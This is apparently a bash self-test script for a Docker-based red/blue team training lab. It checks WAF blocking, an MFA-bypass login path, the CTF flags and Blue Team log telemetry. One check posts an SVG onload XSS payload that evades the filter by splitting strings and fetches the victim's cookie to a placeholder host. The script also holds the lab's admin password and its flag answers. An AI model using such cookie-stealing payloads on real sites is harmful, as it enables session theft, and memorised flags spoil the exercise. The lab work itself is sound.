#!/usr/bin/env bash
#
# verify.sh — automated self-test of the whole lab (Red + Blue).
# Assumes the stack is already up:  docker compose up -d --build
#
# Usage: bash scripts/verify.sh [http://127.0.0.1:3075]
#
set -uo pipefail
T="${1:-http://127.0.0.1:3075}"
J="$(mktemp)"
pass=0; fail=0
code(){ curl -s --noproxy '*' -o /dev/null -w '%{http_code}' "$@"; }
chk(){ if [ "$2" = "$3" ]; then echo "  PASS  $1 ($2)"; pass=$((pass+1)); else echo "  FAIL  $1 (got '$2', want '$3')"; fail=$((fail+1)); fi; }

echo "== Infrastructure =="
chk "GET / returns 200"            "$(code $T/)"                       "200"
chk "X-Powered-By exposed"         "$(curl -s --noproxy '*' -I $T/ | grep -ci 'x-powered-by')" "1"
chk "robots.txt disallows the MFA path" "$(curl -s --noproxy '*' $T/robots.txt | grep -c 'Disallow: /api/verify-mfa')" "1"
chk "pre_auth cookie issued"       "$(curl -s --noproxy '*' -I $T/ | grep -c 'pre_mfa_session=pending_mfa_verification')" "1"

echo "== Red Team path =="
chk "WAF blocks <script> (403)"    "$(code -X POST $T/api/feedback --data-urlencode 'message=<script>x</script>')" "403"
chk "WAF blocks raw 'document'"    "$(code -X POST $T/api/feedback --data-urlencode 'message=document.cookie')" "403"
chk "GET /api/feedback is 405"     "$(code $T/api/feedback)"           "405"
chk "svg+fetch bypass accepted"    "$(code -X POST $T/api/feedback --data-urlencode "message=<svg onload=\"fetch('http://x/'+window['docu'+'ment']['coo'+'kie'])\">")" "200"
chk "/dashboard unauth redirects"  "$(code $T/dashboard)"              "302"

curl -s --noproxy '*' -c "$J" -b "$J" -o /dev/null -X POST $T/login        -d 'username=admin&password=Adm1n@Feedback2026'
chk "login -> /api/verify-mfa"     "$(curl -s --noproxy '*' -c "$J" -b "$J" -o /dev/null -w '%{redirect_url}' -X POST $T/login -d 'username=admin&password=Adm1n@Feedback2026')" "$T/api/verify-mfa"
curl -s --noproxy '*' -c "$J" -b "$J" -o /dev/null -X POST $T/api/verify-mfa -d 'code=123456'
chk "/dashboard with valid session" "$(code -b "$J" $T/dashboard)" "200"
chk "final RED flag present"       "$(curl -s --noproxy '*' -b "$J" $T/dashboard | grep -c 'SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}')" "1"
chk "forged adm_sess rejected"     "$(code --cookie 'adm_sess=adm_sess_forged' $T/dashboard)" "302"
rm -f "$J"

echo "== Blue Team telemetry =="
if docker exec cyberrange-sshd true >/dev/null 2>&1; then
  L="$(docker exec cyberrange-sshd cat /opt/admin/logs/access.log 2>/dev/null)"
  E="$(docker exec cyberrange-sshd cat /opt/admin/logs/error.log 2>/dev/null)"
  chk "access: 200 /dashboard @18:51:55"   "$(grep -c '18:51:55.*GET /dashboard.*200' <<<"$L")" "1"
  chk "access: attacker IP 10.10.14.50"    "$(grep -c '10.10.14.50' <<<"$L")" "6"
  chk "access: XFF base64 present"         "$(grep -c 'UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0' <<<"$L")" "2"
  chk "access: baseline 192.168.1.100"     "$(grep -c '192.168.1.100' <<<"$L")" "5"
  chk "access: attacker never hit MFA"     "$(grep '10.10.14.50' <<<"$L" | grep -c '/api/verify-mfa')" "0"
  chk "error: WAF <script> @18:50:15"      "$(grep -c '18:50:15.*WAF blocked.*<script>' <<<"$E")" "1"
  chk "error: anomaly @18:53:10 CRITICAL"  "$(grep -c '18:53:10.*CRITICAL.*Authentication bypass anomaly' <<<"$E")" "1"
else
  echo "  SKIP  sshd container not running"
fi

echo
echo "== RESULT: ${pass} passed, ${fail} failed =="
[ "$fail" -eq 0 ]
